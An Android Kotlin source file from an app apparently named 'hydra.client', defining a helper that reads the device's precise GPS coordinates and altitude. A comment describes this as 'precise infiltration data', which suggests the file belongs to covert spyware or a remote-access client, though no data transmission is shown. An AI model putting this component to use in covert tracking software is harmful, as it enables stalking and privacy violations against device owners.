package com.hydra.client

import android.annotation.SuppressLint
import android.content.Context
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource

class LocationHelper(private val context: Context) {
    private val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)

    @SuppressLint("MissingPermission")
    fun getCurrentLocation(onLocationReceived: (String) -> Unit) {
        // High accuracy for precise infiltration data
        fusedLocationClient.getCurrentLocation(
            Priority.PRIORITY_HIGH_ACCURACY,
            CancellationTokenSource().token
        ).addOnSuccessListener { location ->
            if (location != null) {
                val result = "Lat: ${location.latitude}, Lon: ${location.longitude}, Alt: ${location.altitude}m"
                onLocationReceived(result)
            } else {
                onLocationReceived("Error: Location is null (GPS might be off)")
            }
        }.addOnFailureListener { e ->
            onLocationReceived("Error: ${e.message}")
        }
    }
}